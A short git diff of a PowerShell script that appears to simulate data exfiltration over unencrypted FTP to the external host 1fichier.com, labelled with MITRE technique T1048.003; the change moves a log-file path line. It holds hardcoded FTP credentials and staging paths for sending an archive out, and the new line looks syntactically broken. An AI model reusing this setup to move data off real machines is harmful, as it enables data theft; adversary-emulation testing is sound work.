@@ -6,13 +6,13 @@ Write-Output "Exfiltratrion over Alternative Protocol: to 1fichier.com"
 Write-Output "Exfiltration over unencrytpted Non-C2 protocol (T1048.003)"
 Write-Output "==============================================================================="
 #
-$LogFile = "env:PUBLIC\exf\ftp_exfiltration.txt";
 $Username = "dikeses498@en2ch.com";
 $Password = "8MXywqhkNzWNrUwVV8cL";
 $Ftp = "ftp://ftp.1fichier.com"; 
 $FtpPort = "21"; 
 $ArchiveName = "data.zip";
 $LocalStorageDir = "$env:PUBLIC\exf";
+$LogFile = $LocalStorageDir"\ftp_exfiltration.txt";
 $Slash = "/"; 
 $AntiSlash = "\"; 
 $Column = ":";
